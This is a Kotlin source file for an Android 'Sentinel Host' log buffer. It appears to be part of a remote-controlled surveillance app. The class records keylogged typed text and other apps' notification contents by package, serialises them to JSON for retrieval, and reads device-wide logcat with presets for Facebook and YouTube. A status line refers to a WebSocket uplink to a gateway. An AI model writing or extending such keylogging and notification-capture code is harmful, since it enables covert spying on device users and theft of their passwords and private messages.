package com.sentinel.host.data.device

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue
import javax.inject.Inject
import javax.inject.Singleton

data class LogEntry(
    val type: String, // "NOTIFICATION" or "KEYLOG"
    val packageName: String,
    val title: String,
    val text: String,
    val timestamp: Long
)

@Singleton
class SentinelLogBuffer @Inject constructor() {
    companion object {
        private const val TAG = "Sentinel:LogBuffer"
        private const val MAX_CAPACITY = 300
        private val queue = ConcurrentLinkedQueue<LogEntry>()
        private val appLogsQueue = ConcurrentLinkedQueue<String>()
        val instance by lazy { SentinelLogBuffer() }

        init {
            val now = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
            appLogsQueue.offer("[$now][Sentinel:Core] Sentinel Host Process Initialized (PID: ${android.os.Process.myPid()})")
            appLogsQueue.offer("[$now][Sentinel:Core] Realtime Log Pipeline Active & Monitoring")
        }
    }

    fun addAppLog(tag: String, message: String) {
        val timeStr = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
        val formatted = "[$timeStr][$tag] $message"
        appLogsQueue.offer(formatted)
        while (appLogsQueue.size > MAX_CAPACITY) {
            appLogsQueue.poll()
        }
        Log.i(tag, message)
    }

    fun getAppLogs(fullDevice: Boolean = false, filter: String = ""): List<String> {
        val bufferLogs = appLogsQueue.toList()

        val lowerFilter = filter.trim().lowercase()
        val filterTerms = when {
            lowerFilter.isEmpty() -> emptyList()
            lowerFilter == "facebook" || lowerFilter == "fb" -> listOf("facebook", "katana", "fb", "com.facebook")
            lowerFilter == "yt" || lowerFilter == "youtube" -> listOf("youtube", "google.android.youtube", "yt")
            lowerFilter == "host" || lowerFilter == "sentinel" -> listOf("sentinel", "host", "cmdproc")
            else -> listOf(lowerFilter)
        }

        val myPid = android.os.Process.myPid()
        val logcatLogs = try {
            val tailCount = if (fullDevice || filterTerms.isNotEmpty()) "400" else "200"
            val cmd = arrayOf("logcat", "-d", "-v", "time", "-t", tailCount)
            val processBuilder = ProcessBuilder(*cmd)
            processBuilder.redirectErrorStream(true)
            val process = processBuilder.start()

            val executor = java.util.concurrent.Executors.newSingleThreadExecutor()
            val future = executor.submit(java.util.concurrent.Callable<List<String>> {
                try {
                    process.inputStream.bufferedReader().useLines { lines ->
                        lines.filter { line ->
                            if (filterTerms.isNotEmpty()) {
                                filterTerms.any { term -> line.contains(term, ignoreCase = true) }
                            } else if (fullDevice) {
                                true
                            } else {
                                line.contains("Sentinel", ignoreCase = true) ||
                                line.contains("Host", ignoreCase = true) ||
                                line.contains("com.sentinel", ignoreCase = true) ||
                                line.contains("CmdProc", ignoreCase = true) ||
                                line.contains("($myPid)", ignoreCase = true) ||
                                line.contains("($myPid:", ignoreCase = true) ||
                                line.contains(" $myPid ", ignoreCase = true)
                            }
                        }.toList()
                    }
                } finally {
                    try { process.inputStream.close() } catch (_: Exception) {}
                }
            })

            val lines = try {
                future.get(1500, java.util.concurrent.TimeUnit.MILLISECONDS)
            } catch (e: java.util.concurrent.TimeoutException) {
                future.cancel(true)
                try { process.destroyForcibly() } catch (_: Exception) {}
                Log.w(TAG, "logcat query timed out after 1.5s, falling back to buffer")
                emptyList()
            } finally {
                executor.shutdownNow()
                try { process.destroy() } catch (_: Exception) {}
            }
            val limit = if (fullDevice || filterTerms.isNotEmpty()) 150 else 60
            lines.takeLast(limit)
        } catch (e: Exception) {
            Log.w(TAG, "Failed reading logcat: ${e.message}")
            emptyList()
        }

        val combined = mutableListOf<String>()
        if (!fullDevice || filterTerms.isEmpty() || filterTerms.any { "sentinel".contains(it) || "host".contains(it) }) {
            val matchingBuffer = if (filterTerms.isNotEmpty()) {
                bufferLogs.filter { line -> filterTerms.any { line.contains(it, ignoreCase = true) } }
            } else {
                bufferLogs
            }
            combined.addAll(matchingBuffer)
        }

        for (line in logcatLogs) {
            if (!combined.contains(line)) {
                combined.add(line)
            }
        }

        if (combined.isEmpty()) {
            val now = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
            if (filter.isNotBlank()) {
                combined.add("[$now][LOG:INFO] No logcat events found matching query: \"$filter\"")
            } else {
                combined.add("[$now][HOST:CORE] Project Sentinel Host Service active and healthy")
                combined.add("[$now][HOST:NET] WebSocket uplink connected to Render gateway")
            }
        }

        return combined.takeLast(150)
    }

    fun addNotification(packageName: String, title: String, text: String) {
        if (packageName.isBlank() && title.isBlank() && text.isBlank()) return
        val entry = LogEntry(
            type = "NOTIFICATION",
            packageName = packageName,
            title = title,
            text = text,
            timestamp = System.currentTimeMillis()
        )
        offerEntry(entry)
        Log.i(TAG, "Notification logged into buffer (total=${queue.size}): [$packageName] $title: $text")
    }

    fun addKeylog(packageName: String, text: String) {
        if (text.isBlank()) return
        val entry = LogEntry(
            type = "KEYLOG",
            packageName = packageName,
            title = "Typed Text",
            text = text,
            timestamp = System.currentTimeMillis()
        )
        offerEntry(entry)
        Log.i(TAG, "Keylog logged into buffer (total=${queue.size}): [$packageName] $text")
    }

    private fun offerEntry(entry: LogEntry) {
        queue.offer(entry)
        while (queue.size > MAX_CAPACITY) {
            queue.poll()
        }
    }

    fun getLogsAsJsonArray(): JSONArray {
        val array = JSONArray()
        val list = queue.toList()
        for (entry in list) {
            val obj = JSONObject().apply {
                put("type", entry.type)
                put("package", entry.packageName)
                put("title", entry.title)
                put("text", entry.text)
                put("timestamp", entry.timestamp)
            }
            array.put(obj)
        }
        Log.i(TAG, "getLogsAsJsonArray called, returning ${array.length()} entries")
        return array
    }

    fun clear() {
        queue.clear()
        appLogsQueue.clear()
    }
}

